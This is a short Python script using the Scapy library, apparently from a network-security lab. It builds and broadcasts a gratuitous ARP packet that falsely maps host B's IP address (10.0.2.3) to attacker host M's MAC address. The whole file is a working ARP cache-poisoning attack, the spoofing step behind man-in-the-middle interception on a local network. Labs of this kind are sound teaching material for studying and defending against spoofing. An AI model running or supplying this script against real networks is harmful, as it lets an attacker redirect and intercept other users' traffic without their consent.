#!/usr/bin/python3

from scapy.all import *

# Define IP and MAC addresses
B_IP = "10.0.2.3"  # Host B's IP(src spoofed)
M_MAC = "08:00:27:46:8a:e7"  # Host M's MAC

# Create Ethernet frame (destination is broadcast)
E = Ether(dst="ff:ff:ff:ff:ff:ff")

# Create ARP gratuitous packet
A = ARP(op=1, psrc=B_IP, hwsrc=M_MAC, pdst=B_IP, hwdst="ff:ff:ff:ff:ff:ff")

# Combine Ethernet and ARP into a single packet
pkt = E/A

# Send the packet
sendp(pkt)